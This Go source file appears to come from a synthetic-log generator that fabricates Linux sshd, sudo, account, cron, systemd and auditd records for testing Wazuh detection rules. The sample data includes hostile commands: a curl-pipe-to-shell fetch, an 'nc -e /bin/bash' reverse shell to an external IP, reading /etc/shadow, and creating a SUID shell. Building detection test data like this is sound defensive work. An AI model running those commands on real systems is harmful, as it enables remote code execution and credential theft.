package catalog

import (
	"fmt"
	"strings"

	"github.com/theshahrukh98khan/LogGen/internal/core"
)

// Linux syslog controls. The message bodies match what OpenSSH, sudo, shadow-utils,
// systemd and auditd actually write, so Wazuh's stock decoders extract the same
// fields they would from a real host.

// linuxPayload builds a record for the configured Linux host.
func linuxPayload(c *core.Ctx, tag string, facility, severity int, msg string) core.Payload {
	return core.Payload{
		Kind:     core.SourceLinux,
		Tag:      tag,
		PID:      c.PID(),
		Host:     c.Env.LinuxHost,
		Facility: facility,
		Severity: severity,
		Message:  msg,
	}
}

var (
	lUser  = param("user", "Username", "auto")
	lSrcIP = param("srcip", "Source IP", "auto")
)

func init() {
	registerLinuxSSH()
	registerLinuxPrivilege()
	registerLinuxAccounts()
	registerLinuxSystem()
}

// ---------------------------------------------------------------------------
// SSH
// ---------------------------------------------------------------------------

func registerLinuxSSH() {
	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sshd-accepted-password", Source: core.SourceLinux,
			Group: "Authentication", Name: "SSH login succeeded (password)",
			Desc:     "A user authenticated over SSH with a password.",
			Channel:  "authpriv", Severity: core.SevLabelInfo,
			Mitre: []string{"T1078"}, Wazuh: []string{"5715"},
			Params: []core.Param{lUser, lSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return linuxPayload(c, "sshd", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("Accepted password for %s from %s port %d ssh2",
					c.P("user", c.User()), c.P("srcip", c.InternalIP()), c.EphemeralPort()))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sshd-accepted-publickey", Source: core.SourceLinux,
			Group: "Authentication", Name: "SSH login succeeded (public key)",
			Desc:     "A user authenticated over SSH with a key. The fingerprint identifies which key was used.",
			Channel:  "authpriv", Severity: core.SevLabelInfo,
			Mitre: []string{"T1078"}, Wazuh: []string{"5715"},
			Params: []core.Param{lUser, lSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return linuxPayload(c, "sshd", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("Accepted publickey for %s from %s port %d ssh2: RSA SHA256:%s",
					c.P("user", c.User()), c.P("srcip", c.InternalIP()),
					c.EphemeralPort(), fingerprint(c)))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sshd-failed-password", Source: core.SourceLinux,
			Group: "Authentication", Name: "SSH failed password",
			Desc:     "Authentication failed for an existing account. Burst this control to simulate brute force.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"5716", "5720"},
			Params: []core.Param{lUser, lSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return linuxPayload(c, "sshd", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("Failed password for %s from %s port %d ssh2",
					c.P("user", c.User()), c.P("srcip", c.ExternalIP()), c.EphemeralPort()))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sshd-invalid-user", Source: core.SourceLinux,
			Group: "Authentication", Name: "SSH invalid user",
			Desc:     "A login was attempted for an account that does not exist — typical of automated scanning.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"5710"},
			Params: []core.Param{lUser, lSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.Pick("admin", "test", "oracle", "postgres", "ubuntu", "git", "ftpuser"))
			return linuxPayload(c, "sshd", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("Invalid user %s from %s port %d",
					user, c.P("srcip", c.ExternalIP()), c.EphemeralPort()))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sshd-root-login-refused", Source: core.SourceLinux,
			Group: "Authentication", Name: "SSH root login refused",
			Desc:     "A direct root login was blocked by PermitRootLogin. Repeated attempts indicate targeting.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"5717"},
			Params: []core.Param{lSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return linuxPayload(c, "sshd", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("User root from %s not allowed because not listed in AllowUsers",
					c.P("srcip", c.ExternalIP())))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sshd-max-auth-attempts", Source: core.SourceLinux,
			Group: "Authentication", Name: "SSH max auth attempts exceeded",
			Desc:     "A client exceeded MaxAuthTries and was disconnected mid-authentication.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"5758"},
			Params: []core.Param{lUser, lSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return linuxPayload(c, "sshd", core.FacAuthPriv, core.SevErr,
				fmt.Sprintf("error: maximum authentication attempts exceeded for %s from %s port %d ssh2 [preauth]",
					c.P("user", c.User()), c.P("srcip", c.ExternalIP()), c.EphemeralPort()))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-pam-auth-failure", Source: core.SourceLinux,
			Group: "Authentication", Name: "PAM authentication failure",
			Desc:     "The PAM stack recorded a failed authentication, carrying the remote host and both uids.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110"}, Wazuh: []string{"5503"},
			Params: []core.Param{lUser, lSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			return linuxPayload(c, "sshd", core.FacAuthPriv, core.SevNotice,
				fmt.Sprintf("pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=%s  user=%s",
					c.P("srcip", c.ExternalIP()), user))
		},
	})
}

// ---------------------------------------------------------------------------
// Privilege escalation
// ---------------------------------------------------------------------------

func registerLinuxPrivilege() {
	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sudo-success", Source: core.SourceLinux,
			Group: "Privilege Escalation", Name: "Sudo command executed",
			Desc:     "A user ran a command as root through sudo. The COMMAND field is what detection rules inspect.",
			Channel:  "authpriv", Severity: core.SevLabelLow,
			Mitre: []string{"T1548.003"}, Wazuh: []string{"5402"},
			Params: []core.Param{lUser, param("command", "Command", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			cmd := c.P("command", c.Pick(
				"/usr/bin/cat /etc/shadow",
				"/bin/systemctl restart nginx",
				"/usr/bin/apt-get update",
				"/usr/bin/find / -perm -4000 -type f",
			))
			return linuxPayload(c, "sudo", core.FacAuthPriv, core.SevNotice,
				fmt.Sprintf("  %s : TTY=pts/%d ; PWD=/home/%s ; USER=root ; COMMAND=%s",
					user, c.Int(0, 3), user, cmd))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sudo-failed", Source: core.SourceLinux,
			Group: "Privilege Escalation", Name: "Sudo authentication failure",
			Desc:     "A user failed the sudo password prompt. Repeated failures suggest a stolen session.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1548.003"}, Wazuh: []string{"5401"},
			Params: []core.Param{lUser, param("command", "Command", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			cmd := c.P("command", "/bin/su -")
			return linuxPayload(c, "sudo", core.FacAuthPriv, core.SevWarning,
				fmt.Sprintf("  %s : %d incorrect password attempts ; TTY=pts/%d ; PWD=/home/%s ; USER=root ; COMMAND=%s",
					user, c.Int(1, 3), c.Int(0, 3), user, cmd))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-sudo-not-in-sudoers", Source: core.SourceLinux,
			Group: "Privilege Escalation", Name: "User not in sudoers",
			Desc:     "An account without sudo rights attempted to use it — a direct privilege escalation attempt.",
			Channel:  "authpriv", Severity: core.SevLabelHigh,
			Mitre: []string{"T1548.003"}, Wazuh: []string{"5403"},
			Params: []core.Param{lUser, param("command", "Command", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			cmd := c.P("command", "/bin/bash")
			return linuxPayload(c, "sudo", core.FacAuthPriv, core.SevAlert,
				fmt.Sprintf("  %s : user NOT in sudoers ; TTY=pts/%d ; PWD=/home/%s ; USER=root ; COMMAND=%s",
					user, c.Int(0, 3), user, cmd))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-su-success", Source: core.SourceLinux,
			Group: "Privilege Escalation", Name: "Switched to root with su",
			Desc:     "A user opened a root shell with su.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1548.003"}, Wazuh: []string{"5303"},
			Params: []core.Param{lUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			return linuxPayload(c, "su", core.FacAuthPriv, core.SevNotice,
				fmt.Sprintf("(to root) %s on pts/%d", user, c.Int(0, 3)))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-su-failed", Source: core.SourceLinux,
			Group: "Privilege Escalation", Name: "Failed su to root",
			Desc:     "An su attempt to root failed authentication.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1548.003"}, Wazuh: []string{"5301"},
			Params: []core.Param{lUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			return linuxPayload(c, "su", core.FacAuthPriv, core.SevWarning,
				fmt.Sprintf("FAILED su for root by %s", user))
		},
	})
}

// ---------------------------------------------------------------------------
// Account management
// ---------------------------------------------------------------------------

func registerLinuxAccounts() {
	Register(core.Definition{
		Control: core.Control{
			ID: "linux-useradd", Source: core.SourceLinux,
			Group: "Account Management", Name: "New user account created",
			Desc:     "A local account was added. A UID of 0 on a second account would mean a hidden root user.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1136.001"}, Wazuh: []string{"5902"},
			Params: []core.Param{lUser, param("uid", "UID", "auto"), param("shell", "Login shell", "/bin/bash")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.Pick("backupsvc", "deploy", "support", "monitor"))
			uid := c.P("uid", fmt.Sprint(c.Int(1002, 1400)))
			shell := c.P("shell", "/bin/bash")
			return linuxPayload(c, "useradd", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("new user: name=%s, UID=%s, GID=%s, home=/home/%s, shell=%s, from=none",
					user, uid, uid, user, shell))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-userdel", Source: core.SourceLinux,
			Group: "Account Management", Name: "User account deleted",
			Desc:     "A local account was removed, which can be an attempt to clean up after access.",
			Channel:  "authpriv", Severity: core.SevLabelMedium,
			Mitre: []string{"T1531"}, Wazuh: []string{"5903"},
			Params: []core.Param{lUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			return linuxPayload(c, "userdel", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("delete user '%s'", user))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-groupadd", Source: core.SourceLinux,
			Group: "Account Management", Name: "New group created",
			Desc:     "A local group was added.",
			Channel:  "authpriv", Severity: core.SevLabelLow,
			Wazuh:  []string{"5901"},
			Params: []core.Param{param("group", "Group name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			group := c.P("group", c.Pick("devops", "deployers", "audit", "support"))
			return linuxPayload(c, "groupadd", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("new group: name=%s, GID=%d", group, c.Int(1002, 1400)))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-usermod-sudo-group", Source: core.SourceLinux,
			Group: "Account Management", Name: "User added to privileged group",
			Desc:     "An account was added to sudo, wheel or root — a direct grant of administrative rights.",
			Channel:  "authpriv", Severity: core.SevLabelHigh,
			Mitre: []string{"T1098"}, Wazuh: []string{"5904"},
			Params: []core.Param{lUser, param("group", "Group name", "sudo")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			group := c.P("group", c.Pick("sudo", "wheel", "root", "admin"))
			return linuxPayload(c, "usermod", core.FacAuthPriv, core.SevNotice,
				fmt.Sprintf("add '%s' to group '%s'", user, group))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-passwd-changed", Source: core.SourceLinux,
			Group: "Account Management", Name: "Password changed",
			Desc:     "An account password was changed.",
			Channel:  "authpriv", Severity: core.SevLabelLow,
			Mitre: []string{"T1098"}, Wazuh: []string{"5905"},
			Params: []core.Param{lUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			return linuxPayload(c, "passwd", core.FacAuthPriv, core.SevInfo,
				fmt.Sprintf("pam_unix(passwd:chauthtok): password changed for %s", user))
		},
	})
}

// ---------------------------------------------------------------------------
// System activity
// ---------------------------------------------------------------------------

func registerLinuxSystem() {
	Register(core.Definition{
		Control: core.Control{
			ID: "linux-cron-executed", Source: core.SourceLinux,
			Group: "Execution", Name: "Cron job executed",
			Desc:     "Cron ran a scheduled command as a user.",
			Channel:  "cron", Severity: core.SevLabelInfo,
			Mitre: []string{"T1053.003"}, Wazuh: []string{"2900"},
			Params: []core.Param{lUser, param("command", "Command", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", "root")
			cmd := c.P("command", c.Pick("/usr/local/bin/backup.sh", "/usr/bin/certbot renew -q", "run-parts --report /etc/cron.hourly"))
			return linuxPayload(c, "CRON", core.FacCron, core.SevInfo,
				fmt.Sprintf("(%s) CMD (%s)", user, cmd))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-crontab-modified", Source: core.SourceLinux,
			Group: "Persistence", Name: "Crontab modified",
			Desc:     "A user's crontab was replaced — one of the oldest persistence mechanisms on Linux.",
			Channel:  "cron", Severity: core.SevLabelHigh,
			Mitre: []string{"T1053.003"}, Wazuh: []string{"2833"},
			Params: []core.Param{lUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			return linuxPayload(c, "crontab", core.FacCron, core.SevInfo,
				fmt.Sprintf("(%s) REPLACE (%s)", user, user))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-systemd-service-started", Source: core.SourceLinux,
			Group: "Execution", Name: "Systemd service started",
			Desc:     "A systemd unit was started.",
			Channel:  "daemon", Severity: core.SevLabelInfo,
			Wazuh:  []string{"2932"},
			Params: []core.Param{param("service", "Service name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			svc := c.P("service", c.Pick("nginx", "postgresql", "docker", "ssh"))
			return linuxPayload(c, "systemd", core.FacDaemon, core.SevInfo,
				fmt.Sprintf("Started %s.service - %s service.", svc, strings.ToUpper(svc[:1])+svc[1:]))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-systemd-new-unit", Source: core.SourceLinux,
			Group: "Persistence", Name: "New systemd unit loaded",
			Desc:     "Systemd reloaded and picked up a new unit file, a common persistence technique.",
			Channel:  "daemon", Severity: core.SevLabelHigh,
			Mitre: []string{"T1543.002"}, Wazuh: []string{"2932"},
			Params: []core.Param{param("service", "Unit name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			svc := c.P("service", c.Pick("syslogd-helper", "network-check", "kworkerd", "cloud-agent"))
			return linuxPayload(c, "systemd", core.FacDaemon, core.SevInfo,
				fmt.Sprintf("Reloading. Started %s.service - %s.", svc, svc))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-auditd-execve", Source: core.SourceLinux,
			Group: "Execution", Name: "Auditd command execution",
			Desc:     "auditd recorded an execve syscall with the full argument vector.",
			Channel:  "audit", Severity: core.SevLabelMedium,
			Mitre: []string{"T1059.004"}, Wazuh: []string{"80700"},
			Params: []core.Param{lUser, param("command", "Command", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			cmd := c.P("command", c.Pick(
				"curl http://"+c.ExternalIP()+"/x.sh|sh",
				"nc -e /bin/bash "+c.ExternalIP()+" 4444",
				"cat /etc/shadow",
				"chmod u+s /tmp/rootbash",
			))
			uid := c.Int(1001, 1400)
			ts := fmt.Sprintf("%d.%03d:%d", c.Now.Unix(), c.Int(0, 999), c.Int(1000, 99999))
			args := strings.Fields("/bin/bash -c")
			msg := fmt.Sprintf(
				`type=EXECVE msg=audit(%s): argc=3 a0="%s" a1="%s" a2="%s"`+
					` AUID="%s" UID="%s" auid=%d uid=%d`,
				ts, args[0], args[1], cmd, user, user, uid, uid)
			return linuxPayload(c, "audispd", core.FacUser, core.SevInfo, msg)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-auditd-suid-created", Source: core.SourceLinux,
			Group: "Privilege Escalation", Name: "SUID binary created",
			Desc:     "A file was given the setuid bit, which lets any user run it as its owner.",
			Channel:  "audit", Severity: core.SevLabelHigh,
			Mitre: []string{"T1548.001"}, Wazuh: []string{"80784"},
			Params: []core.Param{lUser, param("path", "File path", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			path := c.P("path", c.Pick("/tmp/rootbash", "/var/tmp/.hidden/sh", "/dev/shm/bash"))
			uid := c.Int(1001, 1400)
			ts := fmt.Sprintf("%d.%03d:%d", c.Now.Unix(), c.Int(0, 999), c.Int(1000, 99999))
			msg := fmt.Sprintf(
				`type=SYSCALL msg=audit(%s): arch=c000003e syscall=268 success=yes exit=0`+
					` a0=7ffd8c2a1b40 a1=fffff801 items=1 ppid=%d pid=%d auid=%d uid=%d gid=%d`+
					` euid=0 suid=0 fsuid=0 tty=pts0 comm="chmod" exe="/usr/bin/chmod"`+
					` key="privileged" AUID="%s" UID="%s" OUID="root" name="%s"`,
				ts, c.PID(), c.PID(), uid, uid, uid, user, user, path)
			return linuxPayload(c, "audispd", core.FacUser, core.SevNotice, msg)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-firewall-block", Source: core.SourceLinux,
			Group: "Network", Name: "Firewall blocked connection",
			Desc:     "The kernel firewall dropped an inbound packet. Burst this to simulate a port scan.",
			Channel:  "kern", Severity: core.SevLabelLow,
			Mitre: []string{"T1046"}, Wazuh: []string{"4151"},
			Params: []core.Param{lSrcIP, param("dport", "Destination port", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			src := c.P("srcip", c.ExternalIP())
			dport := c.P("dport", fmt.Sprint(c.Pick1(22, 23, 445, 3389, 3306, 5432, 6379)))
			msg := fmt.Sprintf(
				"[UFW BLOCK] IN=eth0 OUT= MAC=%s SRC=%s DST=%s LEN=60 TOS=0x00 PREC=0x00 TTL=%d"+
					" ID=%d DF PROTO=TCP SPT=%d DPT=%s WINDOW=64240 RES=0x00 SYN URGP=0",
				mac(c), src, c.InternalIP(), c.Int(48, 64), c.Int(1000, 65000),
				c.EphemeralPort(), dport)
			return linuxPayload(c, "kernel", core.FacKern, core.SevWarning, msg)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "linux-bash-history-cleared", Source: core.SourceLinux,
			Group: "Defense Evasion", Name: "Shell history cleared",
			Desc:     "auditd saw a shell history file deleted or truncated — an attempt to cover tracks.",
			Channel:  "audit", Severity: core.SevLabelHigh,
			Mitre: []string{"T1070.003"}, Wazuh: []string{"80790"},
			Params: []core.Param{lUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			uid := c.Int(1001, 1400)
			ts := fmt.Sprintf("%d.%03d:%d", c.Now.Unix(), c.Int(0, 999), c.Int(1000, 99999))
			msg := fmt.Sprintf(
				`type=SYSCALL msg=audit(%s): arch=c000003e syscall=87 success=yes exit=0`+
					` items=2 ppid=%d pid=%d auid=%d uid=%d gid=%d tty=pts0 comm="rm"`+
					` exe="/usr/bin/rm" key="history_tampering" AUID="%s" UID="%s"`+
					` name="/home/%s/.bash_history"`,
				ts, c.PID(), c.PID(), uid, uid, uid, user, user, user)
			return linuxPayload(c, "audispd", core.FacUser, core.SevWarning, msg)
		},
	})
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// fingerprint renders a base64-looking SSH key fingerprint.
func fingerprint(c *core.Ctx) string {
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	b := make([]byte, 43)
	for i := range b {
		b[i] = alphabet[c.Rand().Intn(len(alphabet))]
	}
	return string(b)
}

// mac renders the interface MAC block a Linux firewall log carries.
func mac(c *core.Ctx) string {
	parts := make([]string, 14)
	for i := range parts {
		parts[i] = strings.ToLower(c.Hex(2))
	}
	return strings.Join(parts, ":")
}
